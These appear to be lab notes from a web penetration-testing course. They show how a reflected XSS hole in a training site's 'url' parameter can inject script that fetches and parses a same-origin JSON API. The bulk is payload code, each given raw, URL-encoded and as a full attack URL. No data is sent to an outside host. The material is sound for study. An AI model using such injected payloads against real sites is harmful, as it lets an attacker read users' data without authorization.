XHR and JSON Parsing

**********************************************************************************************************************************

What is JSON?

JavaScript Object Notation
text based data exchange
human readable
hierarchical data
AJAX application â€“ alternate to XML

https://en.wikipedia.org/wiki/JSON#Using_JSON_in_JavaScript

**********************************************************************************************************************************

Why JSON Parsing?
XSS can be used to traverse the application
Most modern web application use API based access
Response type is JSON in a large majority

https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse

**********************************************************************************************************************************

Walkthrough
http://pentesteracademylab.appspot.com/lab/webapp/jfp/json?url=xxx
http://pentesteracademylab.appspot.com/lab/webapp/jfp/json/data
{"vuln": 3, "num1": {"version": "1.41", "description": "Buffer overflow", "software": "dempass"}, "num2": {"version": "1", "description": "Integer overflow", "software": "checker"}, "num3": {"version": "9", "description": "Stack overflow", "software": "highdownload"}}

Before encoding:-
<script>
    var req = new XMLHttpRequest();

    req.onreadystatechange = function() {
        if (req.readyState == 4 && req.status == 200) {
            response_obj = JSON.parse(req.responseText);
            alert(response_obj.vuln);

            document.getElementById("result").innerHTML = response_obj.num1.software + " " + response_obj.num1.version + " " + response_obj.num1.description
        }

    };

    req.open("GET", "/lab/webapp/jfp/json/data", true);
    req.send();
</script>

After encoding:-
%3Cscript%3E%0A%20%20%20%20var%20req%20%3D%20new%20XMLHttpRequest()%3B%0A%0A%20%20%20%20req.onreadystatechange%20%3D%20function()%20%7B%0A%20%20%20%20%20%20%20%20if%20(req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20response_obj%20%3D%20JSON.parse(req.responseText)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20alert(response_obj.vuln)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20document.getElementById(%22result%22).innerHTML%20%3D%20response_obj.num1.software%20%2B%20%22%20%22%20%2B%20response_obj.num1.version%20%2B%20%22%20%22%20%2B%20response_obj.num1.description%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%7D%3B%0A%0A%20%20%20%20req.open(%22GET%22%2C%20%22%2Flab%2Fwebapp%2Fjfp%2Fjson%2Fdata%22%2C%20true)%3B%0A%20%20%20%20req.send()%3B%0A%3C%2Fscript%3E

http://pentesteracademylab.appspot.com/lab/webapp/jfp/json?url=%3Cscript%3E%0A%20%20%20%20var%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%0A%20%20%20%20req.onreadystatechange%20%3D%20function%28%29%20{%0A%20%20%20%20%20%20%20%20if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20{%0A%20%20%20%20%20%20%20%20%20%20%20%20response_obj%20%3D%20JSON.parse%28req.responseText%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20alert%28response_obj.vuln%29%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20document.getElementById%28%22result%22%29.innerHTML%20%3D%20response_obj.num1.software%20%2B%20%22%20%22%20%2B%20response_obj.num1.version%20%2B%20%22%20%22%20%2B%20response_obj.num1.description%0A%20%20%20%20%20%20%20%20}%0A%0A%20%20%20%20}%3B%0A%0A%20%20%20%20req.open%28%22GET%22%2C%20%22%2Flab%2Fwebapp%2Fjfp%2Fjson%2Fdata%22%2C%20true%29%3B%0A%20%20%20%20req.send%28%29%3B%0A%3C%2Fscript%3E

Before encoding:-
<script>
    var req = new XMLHttpRequest();

    req.onreadystatechange = function() {
        if (req.readyState == 4 && req.status == 200) {
            response_obj = JSON.parse(req.responseText);
            alert(response_obj.num2.software);

            document.getElementById("result").innerHTML = response_obj.num1.software + " " + response_obj.num1.version + " " + response_obj.num1.description
        }

    };

    req.open("GET", "/lab/webapp/jfp/json/data", true);
    req.send();
</script>

After encoding:-
%3Cscript%3E%0A%20%20%20%20var%20req%20%3D%20new%20XMLHttpRequest()%3B%0A%0A%20%20%20%20req.onreadystatechange%20%3D%20function()%20%7B%0A%20%20%20%20%20%20%20%20if%20(req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20response_obj%20%3D%20JSON.parse(req.responseText)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20alert(response_obj.num2.software)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20document.getElementById(%22result%22).innerHTML%20%3D%20response_obj.num1.software%20%2B%20%22%20%22%20%2B%20response_obj.num1.version%20%2B%20%22%20%22%20%2B%20response_obj.num1.description%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%7D%3B%0A%0A%20%20%20%20req.open(%22GET%22%2C%20%22%2Flab%2Fwebapp%2Fjfp%2Fjson%2Fdata%22%2C%20true)%3B%0A%20%20%20%20req.send()%3B%0A%3C%2Fscript%3E

http://pentesteracademylab.appspot.com/lab/webapp/jfp/json?url=%3Cscript%3E%0A%20%20%20%20var%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%0A%20%20%20%20req.onreadystatechange%20%3D%20function%28%29%20{%0A%20%20%20%20%20%20%20%20if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20{%0A%20%20%20%20%20%20%20%20%20%20%20%20response_obj%20%3D%20JSON.parse%28req.responseText%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20alert%28response_obj.num2.software%29%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20document.getElementById%28%22result%22%29.innerHTML%20%3D%20response_obj.num1.software%20%2B%20%22%20%22%20%2B%20response_obj.num1.version%20%2B%20%22%20%22%20%2B%20response_obj.num1.description%0A%20%20%20%20%20%20%20%20}%0A%0A%20%20%20%20}%3B%0A%0A%20%20%20%20req.open%28%22GET%22%2C%20%22%2Flab%2Fwebapp%2Fjfp%2Fjson%2Fdata%22%2C%20true%29%3B%0A%20%20%20%20req.send%28%29%3B%0A%3C%2Fscript%3E

Before encoding:-
<script>
    var req = new XMLHttpRequest();

    req.onreadystatechange = function() {
        if (req.readyState == 4 && req.status == 200) {
            response_obj = JSON.parse(req.responseText);

            document.getElementById("result").innerHTML = response_obj.num1.software + " " + response_obj.num1.version + " " + response_obj.num1.description
        }

    };

    req.open("GET", "/lab/webapp/jfp/json/data", true);
    req.send();
</script>

After encoding:-
%3Cscript%3E%0A%20%20%20%20var%20req%20%3D%20new%20XMLHttpRequest()%3B%0A%0A%20%20%20%20req.onreadystatechange%20%3D%20function()%20%7B%0A%20%20%20%20%20%20%20%20if%20(req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20response_obj%20%3D%20JSON.parse(req.responseText)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20document.getElementById(%22result%22).innerHTML%20%3D%20response_obj.num1.software%20%2B%20%22%20%22%20%2B%20response_obj.num1.version%20%2B%20%22%20%22%20%2B%20response_obj.num1.description%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%7D%3B%0A%0A%20%20%20%20req.open(%22GET%22%2C%20%22%2Flab%2Fwebapp%2Fjfp%2Fjson%2Fdata%22%2C%20true)%3B%0A%20%20%20%20req.send()%3B%0A%3C%2Fscript%3E

http://pentesteracademylab.appspot.com/lab/webapp/jfp/json?url=%3Cscript%3E%0A%20%20%20%20var%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%0A%20%20%20%20req.onreadystatechange%20%3D%20function%28%29%20{%0A%20%20%20%20%20%20%20%20if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20{%0A%20%20%20%20%20%20%20%20%20%20%20%20response_obj%20%3D%20JSON.parse%28req.responseText%29%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20document.getElementById%28%22result%22%29.innerHTML%20%3D%20response_obj.num1.software%20%2B%20%22%20%22%20%2B%20response_obj.num1.version%20%2B%20%22%20%22%20%2B%20response_obj.num1.description%0A%20%20%20%20%20%20%20%20}%0A%0A%20%20%20%20}%3B%0A%0A%20%20%20%20req.open%28%22GET%22%2C%20%22%2Flab%2Fwebapp%2Fjfp%2Fjson%2Fdata%22%2C%20true%29%3B%0A%20%20%20%20req.send%28%29%3B%0A%3C%2Fscript%3E

**********************************************************************************************************************************
